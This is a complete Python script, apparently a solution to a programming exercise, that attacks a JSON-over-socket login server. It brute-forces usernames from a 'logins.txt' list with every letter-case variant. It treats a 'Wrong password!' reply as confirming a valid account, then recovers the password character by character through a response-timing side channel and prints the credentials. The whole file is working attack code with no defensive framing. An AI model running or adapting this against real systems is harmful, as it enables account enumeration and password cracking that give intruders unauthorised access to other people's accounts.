import itertools
import json
import socket
import string
import sys
import time

args = sys.argv

hostname = args[1]
port = int(args[2])
address = (hostname, port)

login = ''
password = ''
login_correct = False
password_correct = False

login_dict = {
    'login': login,
    'password': password
}


def generate_login_detail(login_detail_list):
    for line in login_detail_list:
        if line != '':
            yield line.strip()


def generate_upper_lower_combinations(login_detail):
    return map(''.join, itertools.product(*zip(login_detail.lower(), login_detail.upper())))


def attempt_login(login_dictionary, connection_socket):
    login_json = json.dumps(login_dictionary)
    message = login_json.encode()
    connection_socket.send(message)

    response = connection_socket.recv(1024)
    response = response.decode()
    response_dictionary = json.loads(response)
    return response_dictionary


with socket.socket() as client_socket:
    client_socket.connect(address)

    with open('logins.txt') as typical_logins:
        while not login_correct:
            login = next(generate_login_detail(typical_logins))

            for attempt in generate_upper_lower_combinations(login):
                login_dict['login'] = attempt
                response_dict = attempt_login(login_dict, client_socket)
                if response_dict['result'] == 'Wrong password!':
                    login_correct = True
                    break

    while not password_correct:
        login_dict['password'] += ' '
        for char in string.printable:
            login_dict['password'] = login_dict['password'][:-1] + char
            timer_start = time.perf_counter()
            response_dict = attempt_login(login_dict, client_socket)
            timer_end = time.perf_counter()
            time_to_receive_response = timer_end - timer_start
            if response_dict['result'] == 'Connection success!':
                password_correct = True
                break
            elif time_to_receive_response > 0.1:
                break

print(json.dumps(login_dict))
